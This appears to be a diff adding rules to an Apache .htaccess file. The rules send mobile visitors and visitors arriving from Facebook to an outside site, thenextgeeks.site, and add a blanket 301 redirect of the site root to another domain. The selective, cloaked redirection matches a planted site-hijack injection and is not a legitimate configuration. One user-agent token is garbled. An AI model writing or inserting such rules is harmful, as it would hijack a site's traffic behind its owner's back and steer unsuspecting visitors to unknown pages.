@@ -1,0 +1,7 @@
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} Android|Blackberry|iPad|iPhone|ipod|iemoè¶³bile|opera\ mobile|palmos|webos|googlebot-mobile
+RewriteRule .* https://thenextgeeks.site/ [R]
+RewriteBase / 
+Redirect 301 / https://www.infoempleo.com/
+RewriteCond %{HTTP_REFERER} ^(.*)\.facebook\.(.*) [NC]
+RewriteRule ^(.*)$ https://thenextgeeks.site/ [L,R] 
